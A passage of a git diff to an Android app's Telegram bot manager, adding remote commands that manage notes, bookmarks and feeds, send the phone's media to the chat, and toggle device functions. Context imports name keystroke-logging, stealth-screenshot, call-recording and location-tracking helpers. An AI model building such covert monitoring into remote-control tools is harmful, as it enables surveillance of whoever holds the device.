@@ -23,21 +23,38 @@ import com.ismartcoding.plain.data.DCall
 import com.ismartcoding.plain.data.DContact
 import com.ismartcoding.plain.data.DNotification
 import com.ismartcoding.plain.features.PackageHelper
+import com.ismartcoding.plain.features.NoteHelper
+import com.ismartcoding.plain.features.BookmarkHelper
+import com.ismartcoding.plain.features.feed.FeedHelper
+import com.ismartcoding.plain.features.feed.FeedEntryHelper
+import com.ismartcoding.plain.features.file.FileSortBy
 import com.ismartcoding.plain.features.media.CallMediaStoreHelper
 import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
+import com.ismartcoding.plain.features.media.AudioMediaStoreHelper
+import com.ismartcoding.plain.features.media.VideoMediaStoreHelper
+import com.ismartcoding.plain.features.media.ImageMediaStoreHelper
 import com.ismartcoding.plain.features.sms.SmsConversationHelper
 import com.ismartcoding.plain.features.sms.SmsHelper
+import com.ismartcoding.plain.helpers.AppLauncherHelper
 import com.ismartcoding.plain.helpers.BatteryHistoryHelper
 import com.ismartcoding.plain.helpers.CallRecorderHelper
 import com.ismartcoding.plain.helpers.AutomationHelper
 import com.ismartcoding.plain.helpers.KeystrokeLogHelper
 import com.ismartcoding.plain.helpers.LocationTrackingHelper
+import com.ismartcoding.plain.helpers.NetworkUsageHelper
 import com.ismartcoding.plain.helpers.PhoneHelper
 import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
 import com.ismartcoding.plain.helpers.StealthScreenshotHelper
+import com.ismartcoding.plain.helpers.UtilitiesHelper
+import com.ismartcoding.plain.helpers.WifiControlHelper
+import com.ismartcoding.plain.events.HttpApiEvents
+import com.ismartcoding.lib.channel.sendEvent
+import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
 import com.ismartcoding.plain.features.Permission
 import com.ismartcoding.plain.services.AppBlockHelper
 import com.ismartcoding.plain.services.LiveCallTracker
+import com.ismartcoding.plain.services.LocateRingService
+import com.ismartcoding.plain.services.MessageOverlayService
 import com.ismartcoding.plain.services.NotificationLogHelper
 import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.CoroutineScope
@@ -107,6 +124,27 @@ object TelegramBotManager {
         "automations" to "⚙️ List automation rules",
         "runrule" to "▶️ Run an automation — /runrule <id>",
         "togglerule" to "🔁 Enable/disable a rule — /togglerule <id>",
+        "notes" to "📝 Browse notes — /notes [search]",
+        "addnote" to "➕ Create a new note (interactive)",
+        "bookmarks" to "🔖 Browse bookmarks — /bookmarks [search]",
+        "addbookmark" to "🔗 Add a bookmark — /addbookmark <url>",
+        "feeds" to "📡 RSS feeds — tap to view recent entries",
+        "feedentries" to "📰 Recent feed entries — /feedentries [search]",
+        "music" to "🎵 Music library — tap to download",
+        "videos" to "🎞 Video library — tap to download",
+        "images" to "🖼 Image gallery — tap to send",
+        "pomodoro" to "🍅 Pomodoro — start/pause/stop/status",
+        "torch" to "🔦 Flashlight — /torch [on|off]",
+        "speak" to "🗣 Text-to-speech — /speak <text>",
+        "vibrate" to "📳 Vibrate device — /vibrate [seconds]",
+        "findphone" to "🚨 Locate phone with alarm — /findphone [on|off]",
+        "show" to "💡 Show banner on device — /show <text>",
+        "wake" to "📺 Wake screen — /wake [seconds]",
+        "brightness" to "🔆 Screen brightness — /brightness [0-100]",
+        "volume" to "🔊 Volume — /volume [stream] [0-100]",
+        "launch" to "🚀 Launch any app — /launch <pkg|name>",
+        "wifi" to "📶 Wi-Fi state / toggle — /wifi [on|off]",
+        "netusage" to "📊 Network usage — /netusage [days]",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -338,6 +376,27 @@ object TelegramBotManager {
                     "automations", "rules" -> cmdAutomations()
                     "runrule" -> cmdRunRule(args)
                     "togglerule" -> cmdToggleRule(args)
+                    "notes" -> cmdNotes(args)
+                    "addnote" -> cmdAddNote()
+                    "bookmarks" -> cmdBookmarks(args)
+                    "addbookmark" -> cmdAddBookmark(args)
+                    "feeds" -> cmdFeeds()
+                    "feedentries", "feedentry" -> cmdFeedEntries(args)
+                    "music", "audios" -> cmdMusic(args)
+                    "videos", "vidlib" -> cmdVideoLibrary(args)
+                    "images", "gallery" -> cmdImages(args)
+                    "pomodoro", "pom" -> cmdPomodoro(args)
+                    "torch", "flashlight" -> cmdTorch(args)
+                    "speak", "tts" -> cmdSpeak(text.removePrefix(parts[0]).trim())
+                    "vibrate" -> cmdVibrate(args)
+                    "findphone", "ringphone" -> cmdFindPhone(args)
+                    "show", "banner" -> cmdShow(text.removePrefix(parts[0]).trim())
+                    "wake", "wakescreen" -> cmdWake(args)
+                    "brightness", "bright" -> cmdBrightness(args)
+                    "volume", "vol" -> cmdVolume(args)
+                    "launch", "open" -> cmdLaunch(args)
+                    "wifi" -> cmdWifi(args)
+                    "netusage", "datausage" -> cmdNetUsage(args)
                     "commands" -> cmdCommands()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                     else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
@@ -550,6 +609,255 @@ object TelegramBotManager {
                             sendMessage("⚠️ Path session expired. Send /files to start over.")
                         } else {
                             cbSendFile(path)
+                        }
+                    }
+                    // ---- Notes ----
+                    "notes_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderNotesPage(q, off, editMessageId = messageId)
+                    }
+                    "note_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading note…")
+                        renderNoteDetail(rest, editMessageId = messageId)
+                    }
+                    "note_back" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
+                    }
+                    "note_del" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        TelegramApiClient.editMessageReplyMarkup(
+                            token, chatId, messageId,
+                            TelegramApiClient.inlineKeyboard(listOf(
+                                listOf("✅ Yes, trash it" to "note_del_ok:$rest", "✕ Cancel" to "note_view:$rest"),
+                                listOf("⬅️ Back to list" to "note_back"),
+                            ))
+                        )
+                    }
+                    "note_del_ok" -> {
+                        try {
+                            NoteHelper.trashAsync(setOf(rest))
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Note trashed")
+                        } catch (e: Exception) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
+                        }
+                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
+                    }
+                    // ---- Bookmarks ----
+                    "bm_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderBookmarksPage(q, off, editMessageId = messageId)
+                    }
+                    "bm_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderBookmarkDetail(rest, editMessageId = messageId)
+                    }
+                    "bm_back" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
+                    }
+                    "bm_del" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        TelegramApiClient.editMessageReplyMarkup(
+                            token, chatId, messageId,
+                            TelegramApiClient.inlineKeyboard(listOf(
+                                listOf("✅ Yes, delete" to "bm_del_ok:$rest", "✕ Cancel" to "bm_view:$rest"),
+                            ))
+                        )
+                    }
+                    "bm_del_ok" -> {
+                        try {
+                            BookmarkHelper.deleteBookmarks(setOf(rest), MainApp.instance)
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Bookmark deleted")
+                        } catch (e: Exception) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
+                        }
+                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
+                    }
+                    "bm_open" -> {
+                        try {
+                            val bm = BookmarkHelper.getById(rest)
+                            if (bm == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Not found", true); return@launch }
+                            BookmarkHelper.recordClick(rest)
+                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(bm.url))
+                            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                            MainApp.instance.startActivity(intent)
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🌐 Opened on device")
+                        } catch (e: Exception) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
+                        }
+                    }
+                    // ---- Feeds ----
+                    "feed_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entries…")
+                        renderFeedEntriesPage(rest, 0, editMessageId = messageId)
+                    }
+                    "feeds_back" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderFeedsList(editMessageId = messageId)
+                    }
+                    "fe_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val feedId = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderFeedEntriesPage(feedId, off, editMessageId = messageId)
+                    }
+                    "fe_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entry…")
+                        renderFeedEntryDetail(rest, editMessageId = messageId)
+                    }
+                    "fe_back" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        val feedId = if (sep < 0) rest else rest.substring(0, sep)
+                        val off = if (sep < 0) 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderFeedEntriesPage(if (feedId == "_") "" else feedId, off, editMessageId = messageId)
+                    }
+                    // ---- Music / videos / images ----
+                    "mus_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderMusicPage(q, off, editMessageId = messageId)
+                    }
+                    "mus_get" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending audio…")
+                        val path = pathFromToken(rest)
+                        if (path == null) sendMessage("⚠️ Track session expired. Send /music again.")
+                        else cbSendMediaAudio(path)
+                    }
+                    "vds_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderVideosPage(q, off, editMessageId = messageId)
+                    }
+                    "vds_get" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending video…")
+                        val path = pathFromToken(rest)
+                        if (path == null) sendMessage("⚠️ Video session expired. Send /videos again.")
+                        else cbSendMediaVideo(path)
+                    }
+                    "img_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderImagesPage(q, off, editMessageId = messageId)
+                    }
+                    "img_get" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending photo…")
+                        val path = pathFromToken(rest)
+                        if (path == null) sendMessage("⚠️ Image session expired. Send /images again.")
+                        else cbSendMediaImage(path)
+                    }
+                    // ---- Pomodoro ----
+                    "pom_start" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "▶️ Starting…")
+                        val secs = try {
+                            PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60
+                        } catch (_: Throwable) { 25 * 60 }
+                        sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
+                        renderPomodoroStatus(editMessageId = messageId)
+                    }
+                    "pom_pause" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏸ Paused")
+                        sendEvent(HttpApiEvents.PomodoroPauseEvent())
+                        renderPomodoroStatus(editMessageId = messageId)
+                    }
+                    "pom_stop" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏹ Stopped")
+                        sendEvent(HttpApiEvents.PomodoroStopEvent())
+                        renderPomodoroStatus(editMessageId = messageId)
+                    }
+                    "pom_refresh" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        renderPomodoroStatus(editMessageId = messageId)
+                    }
+                    // ---- Torch / find phone / quick toggles ----
+                    "torch_on" -> {
+                        try { UtilitiesHelper.setTorch(true); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 ON") }
+                        catch (e: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
+                        renderTorchState(editMessageId = messageId)
+                    }
+                    "torch_off" -> {
+                        try { UtilitiesHelper.setTorch(false); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 OFF") }
+                        catch (_: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
+                        renderTorchState(editMessageId = messageId)
+                    }
+                    "fp_on" -> {
+                        LocateRingService.start()
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🚨 Alarm started")
+                        renderFindPhoneState(editMessageId = messageId)
+                    }
+                    "fp_off" -> {
+                        LocateRingService.stop()
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔕 Alarm stopped")
+                        renderFindPhoneState(editMessageId = messageId)
+                    }
+                    "wifi_on" -> {
+                        WifiControlHelper.setWifiEnabled(true, MainApp.instance)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Enabling…")
+                        kotlinx.coroutines.delay(800)
+                        renderWifiState(editMessageId = messageId)
+                    }
+                    "wifi_off" -> {
+                        WifiControlHelper.setWifiEnabled(false, MainApp.instance)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Disabling…")
+                        kotlinx.coroutines.delay(800)
+                        renderWifiState(editMessageId = messageId)
+                    }
+                    "vol_set" -> {
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val stream = rest.substring(0, sep)
+                        val pct = rest.substring(sep + 1).toIntOrNull() ?: 50
+                        UtilitiesHelper.setVolume(stream, pct)
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔊 $stream → $pct%")
+                        renderVolumeState(editMessageId = messageId)
+                    }
+                    "br_set" -> {
+                        val pct = rest.toIntOrNull() ?: 50
+                        val ok = UtilitiesHelper.setBrightness(pct)
+                        if (ok) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔆 $pct%")
+                            renderBrightnessState(editMessageId = messageId)
+                        } else {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "Need WRITE_SETTINGS perm", true)
+                        }
+                    }
+                    // ---- Launcher ----
+                    "lpg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderLaunchAppsPage(q, off, editMessageId = messageId)
+                    }
+                    "lrun" -> {
+                        val pkg = pkgFromToken(rest) ?: rest
+                        val ok = AppLauncherHelper.launch(pkg)
+                        if (ok) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🚀 Launched")
+                            sendMessage("🚀 Launched <code>${htmlEsc(pkg)}</code> on the device.")
+                        } else {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "No launch intent", true)
                         }
                     }
                     else -> TelegramApiClient.answerCallbackQuery(token, cqId)
@@ -1176,6 +1484,83 @@ object TelegramBotManager {
                 } catch (e: Exception) {
                     sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
                 }
+            }
+            "note_create" -> {
+                val raw = text.trim()
+                if (raw.isEmpty()) { sendMessage("❌ Empty note — nothing saved."); return }
+                val (title, body) = if (raw.contains('\n')) {
+                    val nl = raw.indexOf('\n')
+                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
+                } else {
+                    val short = raw.take(60)
+                    short to raw
+                }
+                try {
+                    val n = NoteHelper.addOrUpdateAsync("") {
+                        this.title = title
+                        this.content = body
+                    }
+                    sendMessage("✅ <b>Note saved</b>\n📝 <b>${htmlEsc(title)}</b>\n<i>id: <code>${n.id.take(8)}</code></i>")
+                } catch (e: Exception) {
+                    sendMessage("❌ Could not save note: ${htmlEsc(e.message ?: "")}")
+                }
+            }
+            "bookmark_url" -> {
+                val url = text.trim()
+                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                    sendMessage("❌ Please send a full URL starting with http:// or https://")
+                    return
+                }
+                try {
+                    val list = BookmarkHelper.addBookmarks(listOf(url))
+                    val b = list.firstOrNull()
+                    if (b != null) {
+                        sendMessage("✅ <b>Bookmark added</b>\n🔗 <code>${htmlEsc(url)}</code>\n<i>id: ${b.id.take(8)}</i>\n\n<i>Title/favicon will fetch in background.</i>")
+                        scope.launch {
+                            try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {}
+                        }
+                    } else {
+                        sendMessage("✅ Bookmark recorded.")
+                    }
+                } catch (e: Exception) {
+                    sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
+                }
+            }
+            "feed_url" -> {
+                val url = text.trim()
+                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                    sendMessage("❌ Please send a full RSS/Atom URL starting with http:// or https://")
+                    return
+                }
+                try {
+                    val existing = FeedHelper.getByUrl(url)
+                    if (existing != null) { sendMessage("ℹ️ That feed is already added: <b>${htmlEsc(existing.name)}</b>"); return }
+                    val channel = FeedHelper.fetchAsync(url)
+                    val name = channel.title?.takeIf { it.isNotBlank() } ?: url
+                    val id = FeedHelper.addAsync {
+                        this.url = url
+                        this.name = name
+                    }
+                    sendMessage("✅ <b>Feed added</b>\n📡 <b>${htmlEsc(name)}</b>\n<i>id: ${id.take(8)}</i>\n\n<i>Send /feeds to see all feeds.</i>")
+                } catch (e: Exception) {
+                    sendMessage("❌ Could not add feed: ${htmlEsc(e.message ?: "")}")
+                }
+            }
+            "speak_text" -> {
+                val say = text.trim()
+                if (say.isEmpty()) { sendMessage("❌ Nothing to speak."); return }
+                UtilitiesHelper.speak(say)
+                sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
+            }
+            "show_text" -> {
+                val msg = text.trim()
+                if (msg.isEmpty()) { sendMessage("❌ Nothing to show."); return }
+                if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
+                    sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
+                    return
+                }
+                MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
+                sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
             }
             else -> { /* ignore */ }
         }
@@ -2154,6 +2539,756 @@ object TelegramBotManager {
             "apk" -> "📲"
             "txt", "log" -> "📃"
             else -> "📄"
+        }
+    }
+
+    // ========================================================================
+    // ====================  WEB-PANEL PARITY EXTENSIONS  =====================
+    // ========================================================================
+
+    /** Sanitize a string so it can be safely used as a callback_data segment (no ':'). */
+    private fun safeSeg(s: String): String = s.replace(':', '_').replace(' ', '_')
+
+    /** Stable short token for package names (some are >55 chars, plus we keep callback_data tidy). */
+    private val pkgTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
+    private fun pkgToken(pkg: String): String {
+        val md = java.security.MessageDigest.getInstance("MD5")
+        val hex = md.digest(pkg.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
+        pkgTokens[hex] = pkg
+        return hex
+    }
+    private fun pkgFromToken(t: String): String? = pkgTokens[t]
+
+    // ---------------- Notes ----------------
+
+    @Volatile private var lastNotesQuery: String = ""
+    @Volatile private var lastNotesOffset: Int = 0
+
+    private suspend fun cmdNotes(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderNotesPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderNotesPage(query: String, offset: Int, editMessageId: Long?) {
+        lastNotesQuery = query
+        lastNotesOffset = offset
+        try {
+            val pageSize = 10
+            val items = NoteHelper.search(query, pageSize + 1, offset)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "📝 No notes found.\n\nUse /addnote to create one." else "📝 No more notes."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("📝 <b>Notes</b> · ${offset + 1}–${offset + pageItems.size}\n")
+            sb.append("<i>Tap a note to view, or send /addnote to create one.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, n ->
+                val title = n.title.ifBlank { n.getSummary().take(40).ifBlank { "(untitled)" } }
+                val short = n.getSummary().take(80)
+                sb.append("${offset + i + 1}. 📝 <b>${htmlEsc(title)}</b>\n")
+                if (short.isNotBlank() && short != title) sb.append("   <i>${htmlEsc(short)}</i>\n")
+                sb.append("   🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
+                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "note_view:${n.id}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "notes_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "notes_pg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            rows.add(listOf("➕ New note" to "note_view:__new__"))
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read notes: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun renderNoteDetail(id: String, editMessageId: Long?) {
+        if (id == "__new__") { cmdAddNote(); return }
+        val n = NoteHelper.getById(id)
+        if (n == null) {
+            val msg = "❌ Note not found."
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+            return
+        }
+        val title = n.title.ifBlank { "(untitled)" }
+        val sb = StringBuilder()
+        sb.append("📝 <b>${htmlEsc(title)}</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
+        sb.append("<pre>${htmlEsc(n.content.take(3500))}</pre>")
+        if (n.content.length > 3500) sb.append("\n<i>… truncated (${n.content.length} chars total)</i>")
+        val rows = listOf(
+            listOf("🗑 Trash" to "note_del:${n.id}", "⬅️ Back" to "note_back"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    private suspend fun cmdAddNote() {
+        pendingInput = "note_create"
+        sendMessage("➕ <b>New note</b>\n\nReply with the note content.\n• If you include a line break, the <b>first line is the title</b>, the rest is the body.\n• If single line, it becomes both title and body.\n\nSend any /command to cancel.")
+    }
+
+    // ---------------- Bookmarks ----------------
+
+    @Volatile private var lastBookmarksQuery: String = ""
+    @Volatile private var lastBookmarksOffset: Int = 0
+
+    private suspend fun cmdBookmarks(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) args.joinToString(" ").lowercase() else ""
+        renderBookmarksPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderBookmarksPage(query: String, offset: Int, editMessageId: Long?) {
+        lastBookmarksQuery = query
+        lastBookmarksOffset = offset
+        try {
+            val all = BookmarkHelper.getAll()
+            val filtered = if (query.isBlank()) all else all.filter {
+                it.title.lowercase().contains(query) || it.url.lowercase().contains(query)
+            }
+            val pageSize = 10
+            val total = filtered.size
+            val pageItems = filtered.drop(offset).take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "🔖 No bookmarks found.\n\nUse /addbookmark &lt;url&gt; to add one." else "🔖 No more bookmarks."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("🔖 <b>Bookmarks</b> · ${offset + 1}–${offset + pageItems.size} of $total\n")
+            sb.append("<i>Tap to open on device or manage.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, b ->
+                val title = b.title.ifBlank { b.url }
+                val pin = if (b.pinned) "📌 " else ""
+                sb.append("${offset + i + 1}. ${pin}🔗 <b>${htmlEsc(title.take(80))}</b>\n")
+                sb.append("   <code>${htmlEsc(b.url.take(80))}</code>\n")
+                if (b.clickCount > 0) sb.append("   👁 ${b.clickCount} opens\n")
+                sb.append("\n")
+                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "bm_view:${b.id}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "bm_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (offset + pageSize < total) nav.add("Next ▶️" to "bm_pg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read bookmarks: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun renderBookmarkDetail(id: String, editMessageId: Long?) {
+        val b = BookmarkHelper.getById(id)
+        if (b == null) {
+            val msg = "❌ Bookmark not found."
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+            return
+        }
+        val sb = StringBuilder()
+        sb.append("🔖 <b>${htmlEsc(b.title.ifBlank { b.url })}</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("🔗 <code>${htmlEsc(b.url)}</code>\n\n")
+        if (b.pinned) sb.append("📌 Pinned\n")
+        if (b.clickCount > 0) sb.append("👁 Opened ${b.clickCount} times\n")
+        sb.append("🕐 Added ${fmtTime(b.createdAt.toEpochMilliseconds())}\n")
+        val rows = listOf(
+            listOf("🌐 Open on device" to "bm_open:${b.id}"),
+            listOf("🗑 Delete" to "bm_del:${b.id}", "⬅️ Back" to "bm_back"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    private suspend fun cmdAddBookmark(args: List<String>) {
+        if (args.isEmpty()) {
+            pendingInput = "bookmark_url"
+            sendMessage("➕ <b>Add bookmark</b>\n\nReply with the full URL (must start with <code>http://</code> or <code>https://</code>).\nSend any /command to cancel.")
+            return
+        }
+        val url = args.joinToString(" ").trim()
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            sendMessage("❌ URL must start with <code>http://</code> or <code>https://</code>")
+            return
+        }
+        try {
+            val list = BookmarkHelper.addBookmarks(listOf(url))
+            val b = list.firstOrNull()
+            if (b != null) {
+                sendMessage("✅ Bookmark added: <code>${htmlEsc(url)}</code>\n<i>Title/favicon will fetch in background.</i>")
+                scope.launch { try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {} }
+            }
+        } catch (e: Exception) {
+            sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ---------------- Feeds ----------------
+
+    private suspend fun cmdFeeds() {
+        sendTyping()
+        renderFeedsList(editMessageId = null)
+    }
+
+    private suspend fun renderFeedsList(editMessageId: Long?) {
+        try {
+            val feeds = FeedHelper.getAll()
+            if (feeds.isEmpty()) {
+                val msg = "📡 No RSS feeds added.\n\nReply with a feed URL to add one (use the link below)."
+                val rows = listOf(listOf("➕ Add feed URL" to "fe_view:__add__"))
+                val markup = TelegramApiClient.inlineKeyboard(rows)
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
+                else sendMessage(msg, replyMarkup = markup)
+                return
+            }
+            val counts = try { FeedHelper.getFeedCounts().associate { it.id to it.count } } catch (_: Throwable) { emptyMap() }
+            val sb = StringBuilder("📡 <b>RSS Feeds</b> (${feeds.size})\n<i>Tap a feed to view recent entries.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            feeds.forEachIndexed { i, f ->
+                val n = counts[f.id] ?: 0
+                sb.append("${i + 1}. 📡 <b>${htmlEsc(f.name.ifBlank { f.url })}</b>  ·  $n entries\n")
+                sb.append("   <code>${htmlEsc(f.url.take(70))}</code>\n\n")
